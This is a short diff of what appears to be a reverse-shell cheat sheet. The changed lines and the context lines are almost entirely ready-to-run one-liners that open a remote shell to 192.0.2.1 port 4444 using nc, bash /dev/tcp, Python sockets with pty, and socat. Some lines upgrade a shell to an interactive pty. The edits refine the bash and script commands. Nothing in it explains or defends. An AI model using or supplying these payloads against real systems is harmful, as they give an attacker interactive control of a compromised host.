@@ -6,7 +6,7 @@ nc -c sh 192.0.2.1 4444
 nc -e /bin/sh 192.0.2.1 4444
 
 # Bash reverse shell
-bash -c 'bash -i &> /dev/tcp/192.0.2.1/4444 0>&1'
+bash -c 'exec bash -i &> /dev/tcp/192.0.2.1/4444 0>&1'
 
 # Python reverse shell, spawns interactive pty
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.0.2.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
@@ -16,5 +16,5 @@ socat file:$(tty),rawer tcp-listen:4444
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.0.2.1:4444
 
 # Possibilities to upgrade to an interactive pty
-script /dev/null
+script -c /bin/bash /dev/null
 python -c 'import pty; pty.spawn("/bin/bash")'
